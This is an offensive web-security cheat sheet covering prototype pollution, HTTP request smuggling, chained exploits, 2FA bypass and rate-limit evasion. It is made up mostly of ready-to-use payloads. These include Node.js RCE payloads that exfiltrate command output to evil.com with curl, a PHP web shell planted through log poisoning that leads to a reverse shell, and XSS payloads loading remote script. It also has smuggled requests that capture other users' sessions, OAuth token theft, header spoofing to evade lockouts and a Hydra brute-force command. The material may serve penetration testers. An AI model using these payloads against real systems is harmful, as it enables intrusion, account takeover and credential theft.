# Prototype Pollution

## What Is It
Pollute JavaScript Object.prototype → affect all objects → XSS, RCE, auth bypass.

## Features / Where to Find
- URL query parameters merged into objects
- JSON body merged/cloned
- jQuery $.extend(), _.merge(), Object.assign() with user input
- Configuration objects from user input
- NoSQL query builders

## Actions / Attack Techniques

### Detection Payloads
```javascript
// In URL
?__proto__[polluted]=true
?constructor[prototype][polluted]=true
?__proto__.polluted=true

// In JSON body
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}

// Verify in console
Object.prototype.polluted   // → "true" = vulnerable
```

### Prototype Pollution → XSS
```javascript
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[src]=//evil.com/xss.js
?__proto__[href]=javascript:alert(1)

// JSON
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```

### Prototype Pollution → RCE (Node.js)
```javascript
// child_process spawn pollution
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=evil.com:4444"}}
{"__proto__": {"execArgv": ["--eval=require('child_process').exec('id|curl http://evil.com/?x='+stdout)"]}}

// via env pollution
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}, "bad": "*/5 * * * * curl evil.com"}}
```

### Prototype Pollution → Auth Bypass
```javascript
// If code does: if (user.isAdmin) { ... }
// Pollute: Object.prototype.isAdmin = true
{"__proto__": {"isAdmin": true}}
// Now ALL objects have isAdmin = true
```

### Client-Side Prototype Pollution
```
# In URL hash or query
https://target.com/#__proto__[polluted]=true
https://target.com/?__proto__[innerHTML]=<script>alert(1)</script>
```

## Tools
```bash
# PPScan - automated detection
git clone https://github.com/msrkp/PPScan
python3 ppscan.py --url https://target.com

# Burp Extension: Server-Side Prototype Pollution Scanner

# Manual with Burp Repeater
# Add to JSON body: "__proto__": {"test": "polluted"}
# Check if Object.prototype.test = "polluted"
```

---

# HTTP Request Smuggling

## What Is It
Desync frontend/backend HTTP parsing → smuggle requests → cache poisoning, auth bypass, XSS.

## Features / Where to Find
- Any application behind a reverse proxy/load balancer
- CDN + backend combinations (Cloudflare + Nginx, etc.)
- Any chunked transfer encoding support

## Attack Types

### CL.TE (Frontend=CL, Backend=TE)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Frontend=TE, Backend=CL)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### TE.TE (Obfuscate Transfer-Encoding)
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: X[\n]Transfer-Encoding: chunked
```

### Smuggling to Bypass Access Control
```http
POST / HTTP/1.1
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

### Capture Other Users' Requests
```http
POST /post/comment HTTP/1.1
Content-Length: 400
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Length: 800
Cookie: session=YOUR_SESSION

csrf=valid&postId=5&comment=
```

## Tools
```bash
# Burp Suite - HTTP Request Smuggler extension
# Right-click → Extensions → HTTP Request Smuggler → Smuggle Attack

# smuggler.py
python3 smuggler.py -u https://target.com/

# h2csmuggler (HTTP/2 smuggling)
python3 h2csmuggler.py --smuggle-reqs reqs.txt https://target.com
```

---

# Attack Chains & Combined Exploits

## SSRF → RCE Chain
```
1. Find SSRF: ?url=http://evil.com ← confirmed via DNS callback
2. Scan internal: ?url=http://192.168.1.1:6379/  ← Redis
3. SSRF → Redis: gopher://127.0.0.1:6379/...
4. Write cron job via Redis
5. Cron executes → RCE
```

## Open Redirect → OAuth Token Theft
```
1. OAuth URL: /auth?redirect_uri=https://target.com/callback
2. Open redirect: /redirect?url=https://evil.com
3. Chain: redirect_uri=https://target.com/redirect?url=https://evil.com
4. Victim auth → token sent to evil.com
5. Account takeover
```

## XSS → Account Takeover Chain
```
1. Stored XSS in profile field
2. Admin views profile → XSS fires
3. Steal admin cookie / CSRF token
4. Use stolen token to create new admin account
5. Full admin takeover
```

## LFI → RCE Chain
```
1. LFI found: ?page=../../../etc/passwd
2. Log poisoning: curl -A "<?php system(\$_GET['cmd']);?>" target.com
3. Include log: ?page=../../../var/log/apache2/access.log&cmd=id
4. RCE confirmed: uid=www-data
5. Reverse shell
```

## Subdomain Takeover → Stored XSS
```
1. Find dangling CNAME: sub.target.com → abandoned.github.io
2. Claim abandoned GitHub Pages
3. Host XSS payload: <script>document.cookie...</script>
4. Find where sub.target.com is embedded (iframe, script src)
5. XSS executes in context of target.com
```

## Mass Assignment → Privilege Escalation → Account Takeover
```
1. Register: {"email":"me@test.com","password":"pass"}
2. Add fields: {"email":"me@test.com","password":"pass","role":"admin","verified":true}
3. Login as admin
4. Create new account with admin role
5. Persistent admin access
```

---

# 2FA / MFA Bypass Techniques

## Features / Where to Find
- Login flows with SMS/Email OTP
- TOTP authenticator apps
- SMS verification
- Email verification

## Bypass Techniques

### 1. Response Manipulation
```http
# Server responds with:
{"success": false, "2fa_required": true}

# Change to:
{"success": true, "2fa_required": false}
```

### 2. OTP Brute Force
```bash
# 6-digit = 1,000,000 combinations
# Check rate limiting: is there a lockout?

# Burp Intruder - Payload: 000000 to 999999
# Turbo Intruder for speed
```

### 3. OTP Reuse
```
1. Get valid OTP
2. Use it → success
3. Try same OTP again
4. If works → OTP not invalidated
```

### 4. Skip 2FA Step
```
1. /login → credentials
2. /login/2fa ← SKIP
3. /dashboard → direct access
```

### 5. Use Old OTP
```
# OTP valid for 30 seconds (TOTP)
# But server accepts 10 minutes old OTP?
# → No expiration enforcement
```

### 6. Race Condition on OTP
```python
# Submit valid OTP 20 times simultaneously
# One succeeds before invalidation
```

### 7. Backup Code Enumeration
```
# Backup codes often sequential or weak
# Try: 12345678, 00000000, etc.
```

---

# Rate Limiting & Brute Force

## Features / Where to Find
- Login endpoints
- Password reset
- OTP verification
- API endpoints
- Search/query endpoints

## Bypass Techniques
```
# IP rotation
X-Forwarded-For: 1.2.3.4  (change each request)
X-Real-IP: 1.2.3.5
X-Originating-IP: 1.2.3.6
X-Remote-IP: 1.2.3.7
X-Client-IP: 1.2.3.8

# Username variation (if rate limit per username)
admin
ADMIN
Admin
admin@target.com
admin+test@target.com

# Null byte in username
admin%00
admin%20

# Case variation in password field

# Add extra headers to appear as different client
X-Custom-Header: different_value_each_request
```

## Tools
```bash
# Hydra
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Burp Intruder
# Set payload to password list
# Check for rate limiting after N requests
```
